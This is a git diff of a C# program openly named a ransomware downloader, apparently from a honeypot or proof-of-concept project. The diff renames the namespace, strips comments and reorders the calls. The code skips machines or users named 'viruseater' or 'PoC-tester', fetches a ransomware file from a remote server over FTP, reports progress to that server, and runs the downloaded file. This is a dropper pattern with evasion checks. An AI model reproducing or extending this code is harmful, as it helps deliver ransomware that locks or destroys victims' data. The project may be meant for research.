@@ -6,42 +6,39 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace BaseLineRansomwareDownloader
+namespace HoneyPot5POCRansomwareDownloader
 {
     class Program
     {
-
         static void Main(string[] args)
         {
             ransomwareDownload();
         }
 
-        //The main process controlling the download
         public static void ransomwareDownload()
         {
-            //Ensures that ransomware isn't downloaded and executed on this computer
             if (Environment.MachineName.Contains("viruseater")) return;
             if (Environment.UserName.Contains("viruseater")) return;
             if (Environment.UserName.Contains("PoC-tester")) return;
             Thread.Sleep(2000);
-
-            //Sets the path of the ransomware to the desktop
             serverCommunicator.setRansomwareFilePath();
-
-            //Recieves the ransomware from the server
-            serverCommunicator.getBaseRansomware();
+            serverCommunicator.getPoCRansomware();
             Console.WriteLine(serverCommunicator.getNAMEONTEST());
             Thread.Sleep(100);
             //Install ransomware
 
-            //Downloads the ransomware
-            serverCommunicator.downloadFileFTP();
+            serverCommunicator.postPoCTaken();
+
             Thread.Sleep(100);
 
-            //Posts to the server that it has been started by ransomware, this marks the ransomware in the 
-            serverCommunicator.postBaseStarted();
+            serverCommunicator.downloadFileFTP();
 
-            //Starts the ransomware
+            Thread.Sleep(100);
+
+            serverCommunicator.postPoCStarted();
+
+            Thread.Sleep(100);
+
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
 
